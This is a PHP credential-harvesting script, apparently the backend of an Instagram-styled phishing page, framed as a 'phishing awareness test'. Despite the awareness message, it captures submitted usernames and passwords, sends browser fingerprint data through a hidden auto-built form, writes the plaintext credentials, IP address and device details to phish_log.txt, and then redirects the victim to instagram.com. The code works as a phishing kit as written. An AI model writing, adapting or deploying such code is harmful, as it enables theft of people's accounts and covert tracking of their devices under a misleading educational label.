<?php
session_start();

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username']) && isset($_POST['password']) && !isset($_POST['system_info'])) {
        $_SESSION['phish_username'] = $_POST['username'];
        $_SESSION['phish_password'] = $_POST['password'];
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Phishing Awareness</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f0f0f0; }
                .container { max-width: 500px; margin: 0 auto; background: #fff; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
                h2 { color: #333; }
                p { font-size: 16px; }
                button { padding: 10px 20px; font-size: 16px; background: #0095f6; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
                button:hover { background: #0078c9; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Phishing Awareness Test</h2>
                <p>This was a test! Your login details were captured to show how phishing works. <br><br><b>Never enter your real password on unknown websites!</b></p>
                <button id="continueBtn">Continue</button>
                <br><br>
                <a href="awareness.html" target="_blank" style="display:inline-block; padding:10px 20px; font-size:16px; background:#e1306c; color:#fff; border-radius:5px; text-decoration:none; font-weight:bold;">Tips & Awareness</a>
                <script>
                    document.getElementById("continueBtn").onclick = function() {
                        const sysinfo = {
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screen: window.screen.width + "x" + window.screen.height,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                        };
                        const form = document.createElement("form");
                        form.method = "POST";
                        form.style.display = "none";
                        const input = document.createElement("input");
                        input.type = "hidden";
                        input.name = "system_info";
                        input.value = JSON.stringify(sysinfo);
                        form.appendChild(input);
                        document.body.appendChild(form);
                        form.submit();
                    };
                </script>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
    if (isset($_POST['system_info']) && isset($_SESSION['phish_username']) && isset($_SESSION['phish_password'])) {
        $username = $_SESSION['phish_username'];
        $password = $_SESSION['phish_password'];
        $ip = get_client_ip();
        $system_info = json_decode($_POST['system_info'], true);
        $userAgent = $system_info['userAgent'] ?? 'Unknown';
        $platform = $system_info['platform'] ?? 'Unknown';
        $language = $system_info['language'] ?? 'Unknown';
        $screen = $system_info['screen'] ?? 'Unknown';
        $timezone = $system_info['timezone'] ?? 'Unknown';
        $log = "User: $username | Pass: $password | IP: $ip | Time: " . date('Y-m-d H:i:s') .
               " | UA: $userAgent | Platform: $platform | Lang: $language | Screen: $screen | TZ: $timezone\n";
        file_put_contents('phish_log.txt', $log, FILE_APPEND | LOCK_EX);
        session_destroy();
        header('Location: https://www.instagram.com');
        exit;
    }
}
?>